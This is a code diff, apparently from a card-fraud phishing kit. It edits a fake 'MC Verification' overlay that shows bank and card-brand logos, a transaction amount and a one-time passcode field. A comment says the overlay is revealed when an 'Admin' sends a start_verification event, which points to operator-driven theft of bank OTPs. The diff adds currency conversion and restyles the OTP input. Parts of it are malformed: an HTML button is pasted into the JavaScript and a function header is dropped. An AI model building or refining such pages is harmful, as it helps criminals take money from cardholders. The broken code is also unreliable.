@@ -539,7 +539,7 @@
 <!-- MC Verification Overlay -->
 <div id="mcVerificationOverlay" class="fullscreen-overlay">
   <!-- Loading Content - Shown Initially -->
-  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0.2);">
+  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
     <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
     
     <!-- Added verification logo during loading -->
@@ -549,7 +549,9 @@
   </div>
   
   <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-<div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
+  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+    <!-- Header with bank and card brand logos -->
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
       <div style="height: 40px; max-width: 45%;">
         <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
       </div>
@@ -595,9 +597,9 @@
       </div>
       
       <!-- OTP input field -->
-     <div style="margin-bottom: 20px; display: flex; align-items: center;">
-  <span style="font-size: 13px; margin-right: 10px; min-width: 150px; font-weight: 600; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
-  <div style="position: relative; flex: 1;">
+      <div style="margin-bottom: 20px; display: flex; align-items: center;">
+        <span style="font-size: 13px; margin-right: 10px; min-width: 150px; font-weight: 600; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
+        <div style="position: relative; flex: 1;">
           <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
           <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
@@ -1033,27 +1035,64 @@ function updateMcVerificationUI(data) {
     setupMcVerificationButtons();
 }
 
-function updateCurrencyDisplay(currency) {
-    const currencySymbol = document.getElementById('currencySymbol');
-    if (currencySymbol) {
-        // Map of currency codes to symbols
-        const symbols = {
-            'USD': '$',
-            'EUR': '€',
-            'GBP': '£',
-            'JPY': '¥',
-            'INR': '₹',
-            'AUD': 'A$',
-            'CAD': 'C$',
-            'CHF': 'CHF'
-        };
-        
-        currencySymbol.textContent = symbols[currency] || '$';
-    }
+function convertCurrency(amount, fromCurrency, toCurrency) {
+  // Basic conversion rates (as of 2023)
+  // In a real app, you would fetch these from an API
+  const rates = {
+    'USD': 1,
+    'EUR': 0.93,
+    'GBP': 0.81,
+    'JPY': 149.5,
+    'INR': 83.20,
+    'CAD': 1.38,
+    'AUD': 1.56,
+    'CNY': 7.25,
+    'CHF': 0.91,
+    'HKD': 7.81
+  };
+  
+  if (!rates[fromCurrency] || !rates[toCurrency]) {
+    return amount; // Can't convert, return original
+  }
+  
+  // Convert to target currency
+  const convertedAmount = (amount / rates[fromCurrency]) * rates[toCurrency];
+  
+  // Format based on currency
+  if (toCurrency === 'JPY' || toCurrency === 'KRW') {
+    return Math.round(convertedAmount); // No decimals for yen and won
+  } else {
+    return convertedAmount.toFixed(2);
+  }
 }
-<button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>
-function setupMcVerificationButtons() {
-    // Submit button handler
+
+function updateCurrencyDisplay(currency) {
+  const currencySymbol = document.getElementById('currencySymbol');
+  const amountDisplay = document.getElementById('transactionAmount');
+  
+  if (currencySymbol && amountDisplay) {
+    // Map of currency codes to symbols
+    const symbols = {
+      'USD': '$',
+      'EUR': '€',
+      'GBP': '£',
+      'JPY': '¥',
+      'INR': '₹',
+      'AUD': 'A$',
+      'CAD': 'C$',
+      'CHF': 'CHF',
+      'CNY': '¥',
+      'HKD': 'HK$'
+    };
+    
+    const originalAmount = state.amount || 1299.00;
+    const convertedAmount = convertCurrency(originalAmount, 'USD', currency);
+    
+    currencySymbol.textContent = symbols[currency] || '$';
+    amountDisplay.textContent = convertedAmount;
+  }
+}
+<button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>    // Submit button handler
     const submitBtn = document.getElementById('mcSubmitBtn');
     if (submitBtn) {
         submitBtn.onclick = function() {
@@ -1140,20 +1179,20 @@ function setupMcVerificationButtons() {
         };
     }
     
-    // OTP input validation and formatting
-    const otpInput = document.getElementById('mcOtpInput');
-    if (otpInput) {
-        otpInput.oninput = function() {
-            // Only allow digits
-            this.value = this.value.replace(/\D/g, '');
-            
-            // Hide error message when typing
-            const errorMsg = document.getElementById('mcOtpError');
-            if (errorMsg) {
-                errorMsg.style.display = 'none';
-            }
-            
-           // Add this new code:
+// OTP input validation and formatting
+const otpInput = document.getElementById('mcOtpInput');
+if (otpInput) {
+  otpInput.oninput = function() {
+    // Only allow digits
+    this.value = this.value.replace(/\D/g, '');
+    
+    // Hide error message when typing
+    const errorMsg = document.getElementById('mcOtpError');
+    if (errorMsg) {
+      errorMsg.style.display = 'none';
+    }
+    
+    // Add this new code:
     const submitBtn = document.getElementById('mcSubmitBtn');
     if (submitBtn) {
       if (this.value.length > 0) {
